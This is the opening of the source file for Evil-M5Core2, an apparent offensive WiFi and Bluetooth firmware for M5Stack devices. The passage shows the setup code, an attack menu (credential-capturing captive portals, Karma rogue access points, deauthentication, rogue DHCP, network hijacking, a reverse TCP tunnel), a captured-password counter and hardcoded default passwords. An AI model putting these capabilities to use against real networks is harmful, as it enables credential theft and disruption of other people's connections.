/*
   Evil-M5Core2 - WiFi Network Testing and Exploration Tool

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/
// remember to change hardcoded webpassword below in the code to ensure no unauthorized access to web interface : !!!!!! CHANGE THIS !!!!!
// Also remember that bluetooth is not protected and anyone can connect to it without pincode ( esp librairies issue) to ensure protection serial password is implemented
// Warning
// You need to bypass the esp32 firmware with scripts in utilities before compiling or deauth is not working due to restrictions on ESP32 firmware
// Warning

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <M5Unified.h>
#include <vector>
#include <string>
#include <set>
#include <TinyGPS++.h>
#include <Adafruit_NeoPixel.h> //led
#include <ArduinoJson.h>
#include <esp_now.h>

#include "BLEDevice.h"
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

#include <vector>
#include <esp_task_wdt.h>

#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <WiFiClient.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

//deauth
#include "esp_wifi_types.h"
#include "esp_event_loop.h"
//deauth end

//sniff and deauth client
#include "esp_err.h"
#include "nvs_flash.h"
#include <map>
#include <algorithm>
#include <regex>
//sniff and deauth client end

#include <IniFile.h>

String scanIp = "";
#include <lwip/etharp.h>
#include <lwip/ip_addr.h>
#include <ESPping.h>

String ssh_user = "";
String ssh_host = "";
String ssh_password = "";
int ssh_port = 22;

#include "BluetoothSerial.h"
BluetoothSerial ESP_BT;


String tcp_host = "";
int tcp_port = 4444;

extern "C" {
#include "esp_wifi.h"
#include "esp_system.h"
}

bool soundOn = true;
bool randomOn = false;

// bluetooth password pass
enum ConnectionState {
  AWAITING_PASSWORD,
  AUTHENTICATED
};
ConnectionState connectionState = AWAITING_PASSWORD;
// end bluetooth password pass


int ledOn = true;// change this to true to get cool led effect (only on fire)

static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;

WebServer server(80);
DNSServer dnsServer;
IPAddress ipAP;    // Adresse IP du mode AP
IPAddress ipSTA;   // Adresse IP du mode STA
bool useAP = true; // Alterner entre AP et STA
const byte DNS_PORT = 53;

int currentIndex = 0, lastIndex = -1;
bool inMenu = true;
const char* menuItems[] = {
  "Scan WiFi",
  "Select Network",
  "Clone & Details",
  "Start Captive Portal",
  "Stop Captive Portal",
  "Change Portal",
  "Check Credentials",
  "Delete All Credentials",
  "Monitor Status",
  "Probes Attack",
  "Probes Sniffing",
  "Karma Attack",
  "Karma Auto",
  "Karma Spear",
  "Select Probe",
  "Delete Probe",
  "Delete All Probes",
  "Bluetooth ON/OFF",
  "Wardriving",
  "Wardriving Master",
  "Beacon Spam",
  "Deauther",
  "Handshake Master",
  "WiFi Raw Sniffing",
  "Sniff Raw Clients",
  "Wifi Channel Visualizer",
  "Client Sniffing and Deauth",
  "Handshake/Deauth Sniffing",
  "Check Handshakes",
  "Wall Of Flipper",
  "Connect to network",
  "PwnGrid Spam",
  "Skimmer Detector",
  "Reverse TCP Tunnel",
  "DHCP Starvation",
  "Rogue DHCP",
  "Switch DNS",
  "Network Hijacking",
  "Detect Printer",
  "File Print",
  "Check printer status",
  "HoneyPot",
  "Settings",
};
const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);

const int maxMenuDisplay = 10;
int menuStartIndex = 0;

String ssidList[100];
int numSsid = 0;
bool isOperationInProgress = false;
int currentListIndex = 0;
String clonedSSID = "Evil-M5Core2";
int topVisibleIndex = 0;

// Connect to nearby wifi network automaticaly to provide internet to the core2 you can be connected and provide AP at same time
// experimental
String ssid = "";
String password = "";

//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
// password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
String accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
const char* bluetoothName = "E7vhi3l0tMh53Cro0rne32"; // !!!!!! CHANGE THIS !!!!!
#define bluetoothSerialPassword "7h30th3r0n3" // !!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!

char ssid_buffer[32] = "";//!!!!!! NOT THIS !!!!!
char password_buffer[64] = ""; //!!!!!! NOT THIS !!!!!

String portalFiles[30]; // 30 portals max
int numPortalFiles = 0;
String selectedPortalFile = "/sites/normal.html"; // defaut portal
int portalFileIndex = 0;


int nbClientsConnected = 0;
int nbClientsWasConnected = 0;
int nbPasswords = 0;
bool isCaptivePortalOn = false;


String macAddresses[10]; // 10 mac address max
int numConnectedMACs = 0;

File fsUploadFile; // global variable for file upload

String captivePortalPassword = "";

// Probe Sniffind part

#define MAX_SSIDS_Karma 200

char ssidsKarma[MAX_SSIDS_Karma][33];
int ssid_count_Karma = 0;
bool isScanningKarma = false;
int currentIndexKarma = -1;
int menuStartIndexKarma = 0;
int menuSizeKarma = 0;
const int maxMenuDisplayKarma = 9;

enum AppState {
  StartScanKarma,
  ScanningKarma,
  StopScanKarma,
  SelectSSIDKarma
};

AppState currentStateKarma = StartScanKarma;

bool isProbeSniffingMode = false;
bool isProbeKarmaAttackMode = false;
bool isKarmaMode = false;

// Probe Sniffing end

// AutoKarma part

volatile bool newSSIDAvailable = false;
char lastSSID[33] = {0};
const int autoKarmaAPDuration = 15000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
bool isAutoKarmaActive = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
static bool isInitialDisplayDone = false;
char lastDeployedSSID[33] = {0};
bool karmaSuccess = false;
//AutoKarma end


//config file
const char* configFolderPath = "/config";
const char* configFilePath = "/config/config.txt";
int defaultBrightness = 255 * 0.35;                         //  35% default Brightness
String selectedStartupImage = "/img/startup-M5Core2.jpg"; // Valeur par défaut
String selectedStartupSound = "/audio/sample.mp3";          // Valeur par défaut
String selectedTheme = "/theme.ini";                        // Selected Theme Default

std::vector<std::string> whitelist;
std::set<std::string> seenWhitelistedSSIDs;
//config file end


// THEME START
// Assign default theme values, ini in SD root can change them
int taskbarBackgroundColor      = TFT_NAVY;     // Taskbar background color
int taskbarTextColor            = TFT_GREEN;  // Taskbar Textcolor
int taskbarDividerColor         = TFT_PURPLE;     // Taskbar divider color
int menuBackgroundColor         = TFT_BLACK;     // Menu background color
int menuSelectedBackgroundColor = TFT_NAVY;  // Color for bar that highlights selected item
int menuTextFocusedColor        = TFT_GREEN;     // Text color for currently selected item
int menuTextUnFocusedColor      = TFT_WHITE; // Text color for items that are not the currently selected
bool Colorful                   = true;
// THEME END

//led part

#define PIN 15
//#define PIN 25 // for M5Stack Core AWS comment above and uncomment this line
#define NUMPIXELS 10

Adafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_GRB);
int delayval = 100;


void setColorRange(int startPixel, int endPixel, uint32_t color) {
  for (int i = startPixel; i <= endPixel; i++) {
    pixels.setPixelColor(i, color);
  }
  pixels.show();
  delay(30);
}

//led part end


// Créer un objet TinyGPS++
int baudrate_gps = 9600;
TinyGPSPlus gps;

//webcrawling
void webCrawling(const IPAddress &ip);
//webcrawling end

bool isItSerialCommand = false;


// deauth and pwnagotchi detector part

const long channelHopInterval = 5000; // hoppping time interval
unsigned long lastChannelHopTime = 0;
int currentChannelDeauth = 1;
bool autoChannelHop = false; // Commence en mode auto
int lastDisplayedChannelDeauth = -1;
bool lastDisplayedMode = !autoChannelHop; // Initialisez à l'opposé pour forcer la première mise à jour
unsigned long lastScreenClearTime = 0; // Pour suivre le dernier effacement de l'écran
char macBuffer[18];
int maxChannelScanning = 13;


int nombreDeHandshakes = 0; // Nombre de handshakes/PMKID capturés
int nombreDeDeauth = 0;
int nombreDeEAPOL = 0;
File pcapFile;
// deauth and pwnagotchi detector end

//vib
bool vibration;


// Sniff and deauth clients

std::map<std::string, std::vector<std::string>> connections;
std::map<std::string, std::string> ap_names;
std::set<int> ap_channels;
std::map<std::string, int> ap_channels_map;

//If you change these value you need to change it also in the code on deauthClients function
unsigned long lastScanTime = 0;
unsigned long scanInterval = 90000; // interval of deauth and scanning network

unsigned long lastChannelChange = 0;
unsigned long channelChangeInterval = 15000; // interval of channel switching

unsigned long lastClientPurge = 0;
unsigned long clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore

unsigned long deauthWaitingTime = 5000; //interval of time to capture EAPOL after sending deauth frame
static unsigned long lastPrintTime = 0;

int nbDeauthSend = 10;

bool isDeauthActive = false;
bool isDeauthFast = false;

// Sniff and deauth clients end





//taskbar
M5Canvas taskBarCanvas(&M5.Display); // Framebuffer pour la barre de tâches
//taskbar end



//mp3

#include <AudioOutput.h>
#include <AudioFileSourceSD.h>
#include <AudioFileSourceID3.h>
#include <AudioGeneratorMP3.h>

// Classe AudioOutputM5Speaker spécifique à votre projet
class AudioOutputM5Speaker : public AudioOutput {
  public:
    AudioOutputM5Speaker(m5::Speaker_Class* m5sound, uint8_t virtual_sound_channel = 0) {
      _m5sound = m5sound;
      _virtual_ch = virtual_sound_channel;
    }
    virtual ~AudioOutputM5Speaker(void) {};
    virtual bool begin(void) override {
      return true;
    }
    virtual bool ConsumeSample(int16_t sample[2]) override {
      if (_tri_buffer_index < tri_buf_size) {
        _tri_buffer[_tri_index][_tri_buffer_index  ] = sample[0];
        _tri_buffer[_tri_index][_tri_buffer_index + 1] = sample[1];
        _tri_buffer_index += 2;
        return true;
      }
      flush();
      return false;
    }
    virtual void flush(void) override {
      if (_tri_buffer_index) {
        _m5sound->playRaw(_tri_buffer[_tri_index], _tri_buffer_index, hertz, true, 1, _virtual_ch);
        _tri_index = _tri_index < 2 ? _tri_index + 1 : 0;
        _tri_buffer_index = 0;
      }
    }
    virtual bool stop(void) override {
      flush();
      _m5sound->stop(_virtual_ch);
      return true;
    }

  protected:
    m5::Speaker_Class* _m5sound;
    uint8_t _virtual_ch;
    static constexpr size_t tri_buf_size = 640;
    int16_t _tri_buffer[3][tri_buf_size];
    size_t _tri_buffer_index = 0;
    size_t _tri_index = 0;
};

// Initialisation des objets pour la lecture audio
static AudioFileSourceSD file;
static AudioOutputM5Speaker out(&M5.Speaker);
static AudioGeneratorMP3 mp3;
static AudioFileSourceID3* id3 = nullptr;

// Fonction pour arrêter la lecture
void stop(void) {
  if (id3 == nullptr) return;
  out.stop();
  mp3.stop();
  id3->close();
  file.close();
  delete id3;
  id3 = nullptr;
}

// Fonction pour lire un fichier MP3
void play(const char* fname) {
  if (id3 != nullptr) {
    stop();
  }
  file.open(fname);
  id3 = new AudioFileSourceID3(&file);
  id3->open(fname);
  mp3.begin(id3, &out);
}


//mp3 end

bool wificonnected = false;
String ipAddress = "";


#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

void setup() {
  M5.begin();
  Serial.begin(115200);
  int GPS_RX_PIN;
  int GPS_TX_PIN;
  switch (M5.getBoard()) {
    case m5::board_t::board_M5StackCore2:
      // Configuration pour Core2
      GPS_RX_PIN = 13;
      GPS_TX_PIN = 14;
      Serial.println("M5Core2 Board detected.");
      vibration = true; // Change this to false for no vibration
      break;
    case m5::board_t::board_M5Stack: // Présumé ici comme étant le modèle Fire
      // Configuration pour Fire
      GPS_RX_PIN = 16;
      GPS_TX_PIN = 17;
      Serial.println("M5Fire Board detected.");
      break;
    default:
      // Modèle non pris en charge ou inconnu, éventuellement définir des valeurs par défaut
      GPS_RX_PIN = -1; // -1 signifie non configuré ou non valide
      GPS_TX_PIN = -1;
      Serial.println("Error detecting board.");
      break;
  }


  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setTextFont(1);
  taskBarCanvas.createSprite(M5.Display.width(), 16); // Créer un framebuffer pour la barre de tâches

  const char* startUpMessages[] = {
    "  There is no spoon...",
    "    Hack the Planet!",
    " Accessing Mainframe...",
    "    Cracking Codes...",
    "Decrypting Messages...",
    "Infiltrating the Network.",
    " Bypassing Firewalls...",
    "Exploring the Deep Web...",
    "Launching Cyber Attack...",
    " Running Stealth Mode...",
    "   Gathering Intel...",
    "     Shara Conord?",
    " Breaking Encryption...",
    "Anonymous Mode Activated.",
    " Cyber Breach Detected.",
    "Initiating Protocol 47...",
    " The Gibson is in Sight.",
    "  Running the Matrix...",
    "Neural Networks Syncing..",
    "Quantum Algorithm started",
    "Digital Footprint Erased.",
    "   Uploading Virus...",
    "Downloading Internet...",
    "  Root Access Granted.",
    "Cyberpunk Mode: Engaged.",
    "  Zero Days Exploited.",
    "Retro Hacking Activated.",
    " Firewall: Deactivated.",
    "Riding the Light Cycle...",
    "  Engaging Warp Drive...",
    "  Hacking the Holodeck..",
    "  Tracing the Nexus-6...",
    "Charging at 2,21 GigaWatt",
    "  Loading Batcomputer...",
    "  Accessing StarkNet...",
    "  Dialing on Stargate...",
    "   Activating Skynet...",
    " Unleashing the Kraken..",
    " Accessing Mainframe...",
    "   Booting HAL 9000...",
    " Death Star loading ...",
    " Initiating Tesseract...",
    "  Decrypting Voynich...",
    "   Hacking the Gibson...",
    "   Orbiting Planet X...",
    "  Accessing SHIELD DB...",
    " Crossing Event Horizon.",
    " Dive in the RabbitHole.",
    "   Rigging the Tardis...",
    " Sneaking into Mordor...",
    "Manipulating the Force...",
    "Decrypting the Enigma...",
    "Jacking into Cybertron..",
    "  Casting a Shadowrun...",
    "  Navigating the Grid...",
    " Surfing the Dark Web...",
    "  Engaging Hyperdrive...",
    " Overclocking the AI...",
    "   Bending Reality...",
    " Scanning the Horizon...",
    " Decrypting the Code...",
    "Solving the Labyrinth...",
    "  Escaping the Matrix...",
    " You know I-Am-Jakoby ?",
    "You know TalkingSasquach?",
    "Redirecting your bandwidth\nfor Leska free WiFi...", // Donation on Ko-fi // Thx Leska !
    "Where we're going We don't\nneed roads   Nefast - 1985",// Donation on Ko-fi // Thx Nefast !
    "Never leave a trace always\n behind you by CyberOzint",// Donation on Ko-fi // Thx CyberOzint !
    "   Injecting hook.worm \nransomware to your android",// Donation on Ko-fi // Thx hook.worm !
    "   Summoning the void  \n          by kdv88", // Donation on Ko-fi // Thx kdv88 !
    "  Egg sandwich - robt2d2",// Donation on Ko-fi // Thx hook.worm ! Thx robt2d2 !
    "    You know Kiyomi ?   ", // for collab on Wof
   "Shoutout GainSec for DateTime!", // for datetime RTC implement
    "           42           ",
    "    Don't be a Skidz !",
    "  Hack,Eat,Sleep,Repeat",
    "   You know Samxplogs ?",
    " For educational purpose",
    "Time to learn something",
    "U Like Karma? Check Mana",
    "   42 because Universe ",
    "Navigating the Cosmos...",
    "Unlocking Stellar Secrets",
    "Galactic Journeys Await..",
    "Exploring Unknown Worlds.",
    "   Charting Star Paths...",
    "   Accessing zone 51... ",
    "Downloading NASA server..",
    "   You know Pwnagotchi ?",
    "   You know FlipperZero?",
    "You know Hash-Monster ?",
    "Synergizing Neuromancer..",
    "Warping Through Cyberspac",
    "Manipulating Quantum Data",
    "Incepting Dreamscapes...",
    "Unlocking Time Capsules..",
    "Rewiring Neural Pathways.",
    "Unveiling Hidden Portals.",
    "Disrupting the Mainframe.",
    "Melding Minds w Machines.",
    "Bending the Digital Rules",
    "   Hack The Planet !!!",
    "Tapping into the Ether...",
    "Writing the Matrix Code..",
    "Sailing the Cyber Seas...",
    "  Reviving Lost Codes...",
    "   HACK THE PLANET !!!",
    " Dissecting DNA of Data",
    "Decrypting the Multiverse",
    "Inverting Reality Matrice",
    "Conjuring Cyber Spells...",
    "Hijacking Time Streams...",
    "Unleashing Digital Demons",
    "Exploring Virtual Vortexe",
    "Summoning Silicon Spirits",
    "Disarming Digital Dragons",
    "Casting Code Conjurations",
    "Unlocking the Ether-Net..",
    " Show me what you got !!!",
    " Do you have good Karma ?",
    "Waves under surveillance!",
    "    Shaking champagne…",
    "Warping with Rick & Morty",
    "       Pickle Rick !!!",
    "Navigating the Multiverse",
    "   Szechuan Sauce Quest.",
    "   Morty's Mind Blowers.",
    "   Ricksy Business Afoot.",
    "   Portal Gun Escapades.",
    "     Meeseeks Mayhem.",
    "   Schwifty Shenanigans.",
    "  Dimension C-137 Chaos.",
    "Cartman's Schemes Unfold.",
    "Stan and Kyle's Adventure",
    "   Mysterion Rises Again.",
    "   Towelie's High Times.",
    "Butters Awkward Escapades",
    "Navigating the Multiverse",
    "    Affirmative Dave,\n        I read you.",
    "  Your Evil-M5Core2 have\n     died of dysentery",
  };

  const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);

  randomSeed(esp_random());

  int randomIndex = random(numMessages);
  const char* randomMessage = startUpMessages[randomIndex];
  auto cfg = M5.config();  // Default M5 configuration
    cfg.external_rtc = true; // Enable RTC
    M5.begin(cfg);           // Initialize M5Unified
    if (!M5.Rtc.isEnabled()) {
        M5.Lcd.println("RTC not found!");
        for (;;) { M5.delay(500); }
    }
    // Set initial date and time (optional, can sync via WiFi/NTP)
    m5::rtc_datetime_t initialTime;
    initialTime.date.year = 2025;
    initialTime.date.month = 1;
    initialTime.date.date = 28;
    initialTime.time.hours = 12;
    initialTime.time.minutes = 30;
    initialTime.time.seconds = 0;
    M5.Rtc.setDateTime(initialTime);  // Set RTC time



  if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
    Serial.println("Error..");
    Serial.println("SD card not mounted...");
    M5.Display.fillRect(0, 0, 240, 135, menuBackgroundColor);
    M5.Display.drawRect(10, 20, 220, 95, TFT_RED);
    M5.Display.fillRect(11, 21, 218, 93, taskbarBackgroundColor);
    M5.Display.setTextColor(TFT_GREEN);
    M5.Display.setTextSize(2);
    int textWidth = M5.Display.textWidth("SD Card Error");
    M5.Display.setCursor((240 - textWidth) / 2, 40);
    M5.Display.println("SD Card Error");
    M5.Display.setTextColor(TFT_RED);
    M5.Display.setTextSize(2);
    textWidth = M5.Display.textWidth("Evil cannot work without SD card");
    M5.Display.setCursor((240 - textWidth) / 2, 85);
    M5.Display.println("Evil cannot work without SD card");
    delay(4000);
    M5.Display.setTextSize(2);
  } else {
    Serial.println("----------------------");
    Serial.println("SD card initialized !! ");
    Serial.println("----------------------");

    // Vérifier et créer le dossier audio s'il n'existe pas
    if (!SD.exists("/audio")) {
      Serial.println("Audio folder not found, creating...");
      if (SD.mkdir("/audio")) {
        Serial.println("Audio folder created successfully.");
      } else {
        Serial.println("Failed to create audio folder.");
      }
    }

    String batteryLevelStr = getBatteryLevel();
    int batteryLevel = batteryLevelStr.toInt();

    if (batteryLevel < 15) {
      drawImage("/img/low-battery-M5Core2.jpg");
      Serial.println("-------------------");
      Serial.println("!!!!Low Battery!!!!");
      Serial.println("-------------------");
      delay(1000);
    }

    // Récupérer les paramètres configurés
    restoreConfigParameter("brightness");
    restoreConfigParameter("ledOn");
    restoreConfigParameter("soundOn");
    restoreConfigParameter("volume");
    restoreConfigParameter("randomOn");
    restoreConfigParameter("selectedTheme");
    restoreConfigParameter("wifi_ssid");
    restoreConfigParameter("wifi_password");
    restoreConfigParameter("ssh_user");
    restoreConfigParameter("ssh_host");
    restoreConfigParameter("ssh_password");
    restoreConfigParameter("ssh_port");
    restoreConfigParameter("tcp_host");
    restoreConfigParameter("tcp_port");
    restoreConfigParameter("baudrate_gps");
    restoreConfigParameter("webpassword");

    restoreThemeParameters();
    delay(500);
    loadStartupImageConfig();
    loadStartupSoundConfig();

    // Si randomOn est activé, charger une image et un son aléatoires
    if (randomOn) {
      String randomImage = getRandomImage();  // Sélectionner une image aléatoire
      String randomSound = getRandomSound();  // Sélectionner un son aléatoire

      drawImage(randomImage.c_str());
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(255, 0, 0));  // LED rouge allumée
        pixels.show();
      }
      if (vibration) {
        M5.Power.Axp192.setLDO3(3300);
        delay(200);
        M5.Power.Axp192.setLDO3(0);
      }
      if (soundOn) {
        play(randomSound.c_str());
        while (mp3.isRunning()) {
          if (!mp3.loop()) {
            mp3.stop();
          } else {
            delay(1);
          }
        }
      } else {
        delay(2000);
      }
    } else {
      // Comportement par défaut
      drawImage(selectedStartupImage.c_str());
      if (vibration) {
        M5.Power.Axp192.setLDO3(3300);
        delay(200);
        M5.Power.Axp192.setLDO3(0);
      }
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(255, 0, 0));  // LED rouge allumée
        pixels.show();
      }
      if (soundOn) {
        play(selectedStartupSound.c_str());
        while (mp3.isRunning()) {
          if (!mp3.loop()) {
            mp3.stop();
          } else {
            delay(1);
          }
        }
      } else {
        delay(2000);
      }
    }
  }

  int textY = 80;
  int lineOffset = 10;
  int lineY1 = textY - lineOffset;
  int lineY2 = textY + lineOffset + 30;

  M5.Display.clear();
  M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
  M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);

  M5.Display.setCursor(80, textY);
  M5.Display.println(" Evil-M5Core2");
  Serial.println("-------------------");
  Serial.println(" Evil-M5Core2");
  M5.Display.setCursor(75, textY + 20);
  M5.Display.println("By 7h30th3r0n3");
  M5.Display.setCursor(102, textY + 45);
  M5.Display.println("v1.3.9 2024");
  Serial.println("By 7h30th3r0n3");
  Serial.println("-------------------");
  M5.Display.setCursor(0 , textY + 120);
  M5.Display.println(randomMessage);
  Serial.println(" ");
  Serial.println(randomMessage);
  Serial.println("-------------------");
  firstScanWifiNetworks();
  if (ledOn) {
    pixels.setPixelColor(4, pixels.Color(0, 0, 0));
    pixels.setPixelColor(5, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(0, 0, 0));
    pixels.setPixelColor(6, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(0, 0, 0));
    pixels.setPixelColor(7, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(0, 0, 0));
    pixels.setPixelColor(8, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);
  }

  if (ssid != "") {
    WiFi.mode(WIFI_MODE_STA);
    WiFi.begin(ssid.c_str(), password.c_str());

    unsigned long startAttemptTime = millis();

    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
      delay(500);
      Serial.println("Trying to connect to Wifi...");
    }

    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("Connected to wifi !!!");
      M5.Display.clear();
      M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2);
      M5.Display.println("Connected to");
      M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2 + 12);
      M5.Display.println(ssid);
      delay(1000);
    } else {
      Serial.println("Fail to connect to Wifi or timeout...");
      WiFi.disconnect();
    }
  } else {
    Serial.println("SSID is empty.");
    Serial.println("Skipping Wi-Fi connection.");
    Serial.println("----------------------");
  }

  pixels.begin(); // led
  Serial2.begin(baudrate_gps, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);  //  GPS, change RX_PIN et TX_PIN if needed
}


void drawImage(const char *filepath) {
  fs::File file = SD.open(filepath);
  M5.Display.drawJpgFile(SD, filepath);

  file.close();
}

bool readDateTimeFromSD(m5::rtc_datetime_t &dt) {
    File file = SD.open("/datetime.txt", FILE_READ);
    if (!file) {
        M5.Lcd.println("Failed to open datetime.txt");
        return false;
    }
    // Read and parse the line
    String line = file.readStringUntil('\n');
    file.close();
    int year, month, day, hour, minute, second;
    if (sscanf(line.c_str(), "%4d-%2d-%2d %2d:%2d:%2d", &year, &month, &day, &hour, &minute, &second) == 6) {
        dt.date.year = year;
        dt.date.month = month;
        dt.date.date = day;
        dt.time.hours = hour;
        dt.time.minutes = minute;
        dt.time.seconds = second;
        return true;
    } else {
        M5.Lcd.println("Invalid datetime format in datetime.txt");
        return false;
    }
}

void updateDateTimeFromSD() {
    M5.Display.clear();
    M5.Display.setCursor(10, 10);
    M5.Display.setTextSize(2);
    M5.Display.println("Updating DateTime...");
    m5::rtc_datetime_t newTime;
    if (readDateTimeFromSD(newTime)) {
        M5.Rtc.setDateTime(newTime); // Update RTC with the new time
        waitAndReturnToMenu("DateTime updated successfully!");
    } else {
        waitAndReturnToMenu("Failed to update DateTime.");
    }
}

void firstScanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 2000) {
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }

  if (n == 0) {
    Serial.println("No network found ...");
  } else {
    Serial.print(n);
    Serial.println(" Near Wifi Networks : ");
    Serial.println("-------------------");
    numSsid = min(n, 100);
    for (int i = 0; i < numSsid; i++) {
      ssidList[i] = WiFi.SSID(i);
      Serial.print(i);
      Serial.print(": ");
      Serial.println(ssidList[i]);
    }
    Serial.println("-------------------");
  }
}

unsigned long previousMillis = 0;
const long interval = 1000;


unsigned long lastTaskBarUpdateTime = 0;
const long taskBarUpdateInterval = 100; // Mettre à jour chaque seconde
bool pageAccessFlag = false;

int getConnectedPeopleCount() {
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;
  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);
  return stationList.num; // Retourne le nombre de clients connectés
}

int getCapturedPasswordsCount() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Error opening credentials file for reading");
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}

void drawTaskBar() {
  taskBarCanvas.setTextSize(1.8);
  taskBarCanvas.fillRect(0, 0, taskBarCanvas.width(), 14, TFT_NAVY); // Dessiner un rectangle bleu en haut de l'écran
  taskBarCanvas.fillRect(0, 14, taskBarCanvas.width(), 8, TFT_PURPLE); // Dessiner un rectangle bleu en haut de l'écran
  taskBarCanvas.setTextColor(TFT_GREEN);

  // Afficher le nombre de personnes connectées
  int connectedPeople = getConnectedPeopleCount();
  taskBarCanvas.setCursor(8, 2); // Positionner à gauche
  taskBarCanvas.print("Sta:" + String(connectedPeople));

  // Afficher le nombre de mots de passe capturés
  int capturedPasswords = getCapturedPasswordsCount();
  taskBarCanvas.setCursor(68, 2); // Positionner après "Sta"
  taskBarCanvas.print("Pwd:" + String(capturedPasswords));

  // Afficher l'indicateur de point clignotant pour les accès aux pages et DNS
  static bool dotState = false;
  dotState = !dotState;
  taskBarCanvas.setCursor(130, 2); // Positionner après "Pwd"

  if (pageAccessFlag) {
    taskBarCanvas.print("" + String(dotState ? "■" : " "));
    pageAccessFlag = false; // Réinitialiser le flag après affichage
  } else {
    taskBarCanvas.print("  ");
  }

  taskBarCanvas.setCursor(142, 2); // Positionner après "■"
  taskBarCanvas.print("P:" + String(isCaptivePortalOn ? "On" : "Off"));

  taskBarCanvas.setCursor(200, 2); // Position après "P:On/Off"
  taskBarCanvas.print("C:");
  taskBarCanvas.setTextColor(WiFi.localIP().toString() != "0.0.0.0" ? TFT_GREEN : TFT_RED);
  taskBarCanvas.print(String(WiFi.localIP().toString() != "0.0.0.0" ? "On" : "Off"));
  taskBarCanvas.setTextColor(taskbarTextColor);


  // Afficher le niveau de batterie à droite
  String batteryLevel = getBatteryLevel();
  int batteryWidth = taskBarCanvas.textWidth(batteryLevel + "%");
  taskBarCanvas.setCursor(taskBarCanvas.width() - batteryWidth - 5, 2); // Positionner à droite
  taskBarCanvas.print(batteryLevel + "%");

  // Afficher le framebuffer de la barre de tâches
  taskBarCanvas.pushSprite(0, 0);
}

void loop() {
  M5.update();
  handleDnsRequestSerial();

  unsigned long currentMillis = millis();

  // Mettre à jour la barre de tâches indépendamment du menu
  if (currentMillis - lastTaskBarUpdateTime >= taskBarUpdateInterval && inMenu) {
    drawTaskBar();
    lastTaskBarUpdateTime = currentMillis;
  }

  if (inMenu) {
    if (lastIndex != currentIndex) {
      drawMenu();
      lastIndex = currentIndex;
    }
    handleMenuInput();
  } else {
    switch (currentStateKarma) {
      case StartScanKarma:
        if (M5.BtnB.wasPressed()) {
          startScanKarma();
          currentStateKarma = ScanningKarma;
        }
        break;

      case ScanningKarma:
        if (M5.BtnB.wasPressed()) {
